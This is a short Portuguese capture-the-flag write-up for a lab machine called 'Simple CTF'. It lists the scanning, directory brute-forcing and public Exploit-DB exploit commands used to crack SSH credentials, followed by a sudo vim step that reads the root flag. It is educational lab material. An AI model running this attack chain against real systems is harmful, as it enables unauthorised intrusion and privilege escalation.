# Simple CTF

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.133.241
```
![image](https://github.com/lufffe/Writeups/assets/90646635/dbb9a7c6-610d-4bab-bc9b-2c9b6a438319)

![image](https://github.com/lufffe/Writeups/assets/90646635/4a77208c-56bf-4d6b-8f98-ce1647a60ba8)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 21,80,2222 10.10.133.241
```
![image](https://github.com/lufffe/Writeups/assets/90646635/822eed72-15ad-4392-bc7b-e8d35332826c)

* ### Scan Arquivos e diretorios.
```bash
gobuster dir -u http://10.10.133.241 -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8b22f507-78c9-4294-9d3d-4f518cfb0eb8)

* ### Vendo o que está sendo executado no http e então procurar um exploit que consiga fazer algo nessa aplicação.
![image](https://github.com/lufffe/Writeups/assets/90646635/29e3f5ef-ce2d-4053-8c92-8f67f92802b2)

* ### Exploit.
  
* https://www.exploit-db.com/exploits/46635
 
![image](https://github.com/lufffe/Writeups/assets/90646635/267a575d-19cf-4526-986b-4dca16f48013)


```bash
python3 46635.py
```
![image](https://github.com/lufffe/Writeups/assets/90646635/99925b1b-02c0-45e0-bb26-bd737894eeae)


```bash
python3 46635.py -u http://10.10.133.241/simple/ --crack -w ~/rockyou.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e51adcdd-fbc0-4cef-9708-706be03cd882)

mitch / #######

* ### Acessando via ssh com a credencial encontrada.
```bash
ssh mitch@10.10.133.241 -p 2222
```
![image](https://github.com/lufffe/Writeups/assets/90646635/cb4ee76c-c824-41a2-bd1d-3d8c7a52d126)

* ### Flag User + outro usuário no diretorio /home.
![image](https://github.com/lufffe/Writeups/assets/90646635/282e29a8-fa57-44c1-98ef-d4b2dc27e8d4)

```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/b67e2218-9b2c-48c2-a163-22ae9fedbc3f)

* ### Flag Root.
```bash
$ sudo /usr/bin/vim /root/root.txt
```
